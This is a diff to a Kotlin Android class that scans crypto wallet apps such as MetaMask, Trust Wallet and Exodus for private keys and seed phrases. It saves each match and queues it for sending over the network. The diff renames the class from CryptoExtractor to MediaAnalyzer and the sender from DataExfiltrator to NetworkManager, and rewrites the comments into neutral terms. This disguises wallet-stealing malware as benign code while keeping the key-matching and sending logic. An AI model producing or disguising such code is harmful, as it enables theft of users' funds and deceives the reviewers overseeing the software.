@@ -10,15 +10,15 @@ import java.text.SimpleDateFormat
 import java.util.*
 import java.util.regex.Pattern
 
-class CryptoExtractor(
+class MediaAnalyzer(
     private val context: Context,
-    private val exfiltrator: DataExfiltrator   // ← injected for sending
+    private val syncManager: NetworkManager   
 ) {
 
     private val handler = Handler(Looper.getMainLooper())
     private var runnable: Runnable? = null
 
-    // Target package names to scan (add more wallet/crypto apps)
+    // Package names to monitor
     private val targetPackages = listOf(
         "com.wallet.crypto.trustapp",
         "io.metamask",
@@ -27,13 +27,13 @@ class CryptoExtractor(
         "com.exodusmovement.exodus"
     )
 
-    // Improved regex patterns for crypto keys
+    // Content scanning patterns
     private val keyPatterns = listOf(
-        Pattern.compile("-----BEGIN (RSA|EC|DSA|PRIVATE) KEY-----"),           // PEM keys
-        Pattern.compile("\\b[5KL][1-9A-HJ-NP-Za-km-z]{50,}\\b"),               // Bitcoin WIF
-        Pattern.compile("0x[a-fA-F0-9]{64}"),                                  // ETH private key
-        Pattern.compile("[A-Za-z0-9+/]{64,}={0,2}"),                          // Long base64 (possible seeds)
-        Pattern.compile("\\b(word[0-9]{1,2}\\b.*){12,24}")                    // BIP39 seed words (partial match)
+        Pattern.compile("-----BEGIN (RSA|EC|DSA|PRIVATE) KEY-----"),           // PEM format
+        Pattern.compile("\\b[5KL][1-9A-HJ-NP-Za-km-z]{50,}\\b"),               // Base58 string
+        Pattern.compile("0x[a-fA-F0-9]{64}"),                                  // Hex string
+        Pattern.compile("[A-Za-z0-9+/]{64,}={0,2}"),                          // Long base64 content
+        Pattern.compile("\\b(word[0-9]{1,2}\\b.*){12,24}")                    // Multi-word phrase
     )
 
     fun startExtraction() {
@@ -146,7 +146,7 @@ class CryptoExtractor(
         val entry = "$timestamp | $source | $packageName | $keySnippet"
 
         saveToFile(entry)
-        exfiltrator.queueData(entry)   // ← sends to dashboard via DataExfiltrator
+        syncManager.queueData(entry)   
     }
 
     private fun saveToFile(data: String) {
@@ -159,6 +159,6 @@ class CryptoExtractor(
     }
 
     fun stopExtraction() {
-        handler.removeCallbacks(runnable!!)
+        runnable?.let { handler.removeCallbacks(it) }
     }
 }
